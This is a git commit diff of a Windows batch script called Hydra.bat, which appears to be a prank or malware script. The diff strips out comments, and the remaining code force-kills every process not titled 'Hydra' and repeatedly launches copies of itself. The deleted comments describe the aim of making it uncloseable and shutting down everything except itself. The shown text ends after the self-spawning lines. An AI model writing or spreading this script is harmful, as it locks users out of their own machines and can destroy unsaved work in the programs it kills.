7fd17967ed94f584f617e8650e7e7f4f47ae8b19
JoinRajuncraftNow <thecajunthatrages@gmail.com>
2016-02-11 15:27:00 -0500

    Update Hydra.bat

--- Hydra.bat
+++ Hydra.bat
@@ -1,14 +1,11 @@
 @ECHO OFF
-::Law of sines sin A/a=sin B/b=Sin C/c
 TITLE Hydra
 set n=1
-:loop
-::Lets make this uncloseable by all other programs. 
+:loop 
 FOR /F "tokens=* USEBACKQ" %%F IN (`tasklist /FI "WINDOWTITLE eq Hydra" ^| find/c "exe"`) DO (
 SET windowcount=%%F
 )
 TASKKILL /F /FI "WINDOWTITLE ne Hydra"
-::Closes everything except for itself. They have to have a batch file already on their desktop to stop this one.
 IF "%windowcount%"=="%n%" (
 START Hydra.bat
 START Hydra.bat
